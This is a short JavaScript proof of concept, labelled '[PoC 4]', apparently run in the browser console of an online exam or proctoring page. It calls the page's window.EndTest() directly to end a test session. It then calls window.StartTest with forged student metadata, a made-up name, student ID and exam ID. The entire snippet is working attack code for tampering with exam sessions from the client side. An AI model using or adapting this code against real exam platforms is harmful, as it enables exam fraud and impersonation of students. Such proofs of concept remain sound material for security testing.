

(function() {
    if (typeof window.EndTest === "function") {
        window.EndTest();
        console.log("[PoC 4] window.EndTest() executed directly.");
    } else {
        console.log("[PoC 4] window.EndTest not found in current context.");
    }

    if (typeof window.StartTest === "function") {
        console.log("[PoC 4] Calling window.StartTest with forged student metadata...");
        window.StartTest({
            studentName: "Forged Student",
            studentId: "999999",
            examId: "MOCK-EXAM-001"
        });
    }
})();
